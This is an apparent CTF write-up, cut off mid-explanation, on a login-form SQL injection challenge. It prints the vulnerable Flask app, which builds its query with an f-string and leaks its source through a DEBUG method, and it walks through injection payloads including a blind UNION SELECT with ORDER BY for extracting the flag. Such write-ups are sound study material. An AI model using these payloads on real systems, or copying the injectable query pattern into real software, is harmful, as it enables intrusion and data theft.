
<div>03/05/2022</div>
@alguien, shared an amazing CTF challenge. I tried to figure it out and learned a lot along the way. I had to wait until he showed how to solve 
it because I couldn't do it.

The challenge is up on http://challenge.alguien.site:31337/ \
There is a simple login form where we can try to log in with different default credentials.

One of the first attemps is to try SQL injections, like `admin' or '1'='1' --` but it throws an error.
<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/login-error.png" width="500">

Now, let's take a look into the page source code, this is always the first step in every web app hacking. Here, we can find a clue.

```html
<script>debug = () => {var xhttp = new XMLHttpRequest(); xhttp.open('DEBUG', '/', true); xhttp.send();}</script>
```

This is a javascript function called "debug()". If we execute that function in the console from the developer tools of the browser, it will make a DEBUG request to the server, if we go to the network tab, we can see that it returns some code, in the Response tab we can see it. For our lucky, it returns the source code used on this web application: [app.py](https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/app.py)

```python
from flask import Flask, render_template, request
import sqlite3, os

FLAG = os.getenv('FLAG') or 'FLAG{dummy_flag}'
app = Flask(__name__)

def check_login(username, password):
    con = sqlite3.connect('database.db')
    cur = con.cursor()
    try:
        res = cur.execute(f"select 1,'admin','123456','{FLAG}' from users where username='{username}'").fetchone()
    except:
        return False
    finally:
        cur.close()
        con.close()
    if res is None:
        return False
    if password == res[2]:
        return True
    return False

@app.route('/', methods=['GET', 'DEBUG'])
def index():
    if request.method == 'DEBUG':
        return open(__file__, 'rt').read()
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    if check_login(username, password):
        return render_template('index.html', success='Nice, you are logged in! But... Where is the flag?')
    return render_template('index.html', error='Sorry, your username or password is bad')

def create_database():
    con = sqlite3.connect('database.db')
    cur = con.cursor()
    cur.execute('create table users (id integer primary key, username varchar(100), password varchar(100), flag varchar(100))')
    cur.execute("insert into users values (1, 'admin', '123456', '')")
    con.commit()
    cur.close()
    con.close()

if __name__ == '__main__':
    # create_database()     # the database already exists
    app.run(debug=True)
```

With this code we can see some important things:
 1. The correct credentials of the login form are admin:123456
 2. A sqlite3 database
 3. The database has a table (users) with 4 columns (id, username, password and flag)
 4. The code used to create the database and each value types
 5. The query executed when we try to log in

If we look at the command issued to create the database, there is NO values inserted into the flag column, instead, the flag is hardcoded into the query executed when we try to log in, also the password, so, the database is just giving the username. This is why a normal SQL injection will fail in this case, because the database doesn't have the flag.

As we know the executed query, it help us for making our injection code. We already know how many columns the table has, even the name of the table. So, this save a lot of work.

We are facing a BLIND injection, because we don't see the information reflected on the website, we only receive a "correct login" message when the entered data is ok or "incorrect login" when the sent data is not ok. The technique we can do here is the UNION SELECT based on the query the website is executing.

To exfiltrate the data, we can take advantage of the "order by" command. What this will do is sort the information we providde with the information stored in the original query. After the SELECT command, we need to provide 4 values separated by , to match the 4 values in the original query. The "order by 4,1" command will sort by the 4th column of the data first (the flag column) and if those values are the same, it will sort by the 1st column , and since we give a 0 as id, our data will always be on top when the flags values become the same. And this is very important because of the `.fetchone()` function in the python script, it will grab only the first row as the query result.

Let's see an example: \
Injected code: `admin' UNION SELECT 0,'x','y','z' ORDER BY 4,1 --` \
Original query: `SELECT 1,'admin','123456','{FLAG}' FROM users WHERE username='{username}'` \
Executed query: `SELECT 1,'admin','123456','{FLAG}' FROM users WHERE username='admin' UNION SELECT 0,'x','y','z' ORDER BY 4,1 --'` \
Let's imagine a table created by the "order by" command, it will result like this:

| id | username | password | flag |
| --- | --- | --- | --- |
| 0 | x | y | z |
| 1 | admin | 123456 | {flag} |

